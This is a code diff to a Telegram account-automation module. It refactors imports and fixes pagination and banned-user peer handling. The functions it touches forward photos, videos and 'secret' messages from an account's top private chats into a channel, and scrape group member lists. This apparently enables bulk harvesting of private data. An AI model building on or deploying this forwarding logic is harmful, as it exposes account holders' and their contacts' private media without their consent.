@@ -28,6 +28,9 @@ const isPermanentError_1 = __importDefault(require("../../../utils/isPermanentEr
 const helpers_1 = require("./helpers");
 const connection_manager_1 = require("../utils/connection-manager");
 const dialog_chat_utils_1 = require("../../../utils/telegram-utils/dialog-chat-utils");
+const message_operations_1 = require("./message-operations");
+const chat_operations_1 = require("./chat-operations");
+const message_search_dto_1 = require("../dto/message-search.dto");
 async function createGroup(ctx) {
     const groupName = 'Saved Messages';
     const groupDescription = ctx.phoneNumber;
@@ -88,20 +91,16 @@ async function createOrJoinChannel(ctx, channel) {
     return { id: channelId, accesshash: channelAccessHash };
 }
 async function forwardMedia(ctx, channel, fromChatId) {
-    const { searchMessages, forwardMessages } = require('./message-operations');
-    const { getTopPrivateChats } = require('./chat-operations');
-    const { MessageMediaType } = require('../dto/message-search.dto');
     let channelId;
     try {
         ctx.logger.info(ctx.phoneNumber, `Forwarding media from chat to channel ${channel} from ${fromChatId}`);
         if (fromChatId) {
             const channelDetails = await createOrJoinChannel(ctx, channel);
             channelId = channelDetails.id;
-            const { forwardSecretMsgs } = require('./message-operations');
-            await forwardSecretMsgs(ctx, fromChatId, channelId?.toString());
+            await (0, message_operations_1.forwardSecretMsgs)(ctx, fromChatId, channelId?.toString());
         }
         else {
-            const result = await getTopPrivateChats(ctx);
+            const result = await (0, chat_operations_1.getTopPrivateChats)(ctx);
             const chats = result.items;
             const me = await ctx.client.getMe();
             if (chats.length > 0) {
@@ -110,10 +109,10 @@ async function forwardMedia(ctx, channel, fromChatId) {
                 const finalChats = new Set(chats.map((chat) => chat.chatId));
                 finalChats.add(me.id?.toString());
                 for (const chatId of finalChats) {
-                    const mediaMessages = await searchMessages(ctx, { chatId, limit: 1000, types: [MessageMediaType.PHOTO, MessageMediaType.VIDEO, MessageMediaType.ROUND_VIDEO, MessageMediaType.DOCUMENT, MessageMediaType.VOICE, MessageMediaType.ROUND_VOICE] });
+                    const mediaMessages = await (0, message_operations_1.searchMessages)(ctx, { chatId, limit: 1000, types: [message_search_dto_1.MessageMediaType.PHOTO, message_search_dto_1.MessageMediaType.VIDEO, message_search_dto_1.MessageMediaType.ROUND_VIDEO, message_search_dto_1.MessageMediaType.DOCUMENT, message_search_dto_1.MessageMediaType.VOICE, message_search_dto_1.MessageMediaType.ROUND_VOICE] });
                     ctx.logger.info(ctx.phoneNumber, `Forwarding messages from chat: ${chatId} to channel: ${channelId}`);
-                    await forwardMessages(ctx, chatId, channelId, mediaMessages.photo.messages);
-                    await forwardMessages(ctx, chatId, channelId, mediaMessages.video.messages);
+                    await (0, message_operations_1.forwardMessages)(ctx, chatId, channelId.toString(), mediaMessages.photo.messages);
+                    await (0, message_operations_1.forwardMessages)(ctx, chatId, channelId.toString(), mediaMessages.video.messages);
                 }
             }
             ctx.logger.info(ctx.phoneNumber, 'Completed forwarding messages from top private chats to channel:', channelId);
@@ -186,19 +185,21 @@ async function leaveChannels(ctx, chats) {
                 chatType = entity.broadcast ? 'channel' : 'supergroup';
                 left = true;
             }
-            else if (entity instanceof telegram_1.Api.Chat) {
-                await ctx.client.invoke(new telegram_1.Api.messages.DeleteChatUser({
-                    chatId: entity.id,
-                    userId: me.id,
-                    revokeHistory: false,
-                }));
-                chatType = 'group';
-                left = true;
-            }
             else {
-                ctx.logger.warn(ctx.phoneNumber, `Unknown entity type for ${id}, skipping`);
-                skipCount++;
-                continue;
+                if (entity instanceof telegram_1.Api.Chat) {
+                    await ctx.client.invoke(new telegram_1.Api.messages.DeleteChatUser({
+                        chatId: entity.id,
+                        userId: me.id,
+                        revokeHistory: false,
+                    }));
+                    chatType = 'group';
+                    left = true;
+                }
+                else {
+                    ctx.logger.warn(ctx.phoneNumber, `Unknown entity type for ${id}, skipping`);
+                    skipCount++;
+                    continue;
+                }
             }
             if (left) {
                 ctx.logger.info(ctx.phoneNumber, `Left ${chatType}: ${id}`);
@@ -237,9 +238,11 @@ async function getGrpMembers(ctx, entity, offset = 0, limit = 200) {
             hash: (0, big_integer_1.default)(0),
         }));
         let totalCount = 0;
+        let consumedCount = 0;
         if (participants instanceof telegram_1.Api.channels.ChannelParticipants) {
             totalCount = participants.count;
             const users = participants.participants;
+            consumedCount = users.length;
             ctx.logger.info(ctx.phoneNumber, `Members: ${users.length}, Total: ${totalCount}`);
             for (const user of users) {
                 const userInfo = user instanceof telegram_1.Api.ChannelParticipant ? user.userId : null;
@@ -259,9 +262,9 @@ async function getGrpMembers(ctx, entity, offset = 0, limit = 200) {
         else {
             ctx.logger.info(ctx.phoneNumber, 'No members found or invalid group.');
         }
-        const nextOffset = offset + result.length;
-        const hasMore = nextOffset < totalCount;
-        ctx.logger.info(ctx.phoneNumber, `Fetched ${result.length}, hasMore=${hasMore}`);
+        const nextOffset = offset + consumedCount;
+        const hasMore = consumedCount > 0 && nextOffset < totalCount;
+        ctx.logger.info(ctx.phoneNumber, `Fetched ${result.length} (consumed ${consumedCount}), hasMore=${hasMore}`);
         return {
             members: result,
             pagination: {
@@ -399,8 +402,10 @@ async function getGroupBannedUsers(ctx, groupId) {
         const participants = result.participants;
         return participants.map(participant => {
             const bannedRights = participant.bannedRights;
+            const peer = participant.peer;
+            const peerId = peer?.userId ?? peer?.channelId ?? peer?.chatId;
             return {
-                userId: participant.peer.chatId.toString(),
+                userId: peerId != null ? peerId.toString() : '',
                 bannedRights: {
                     viewMessages: bannedRights.viewMessages || false,
                     sendMessages: bannedRights.sendMessages || false,
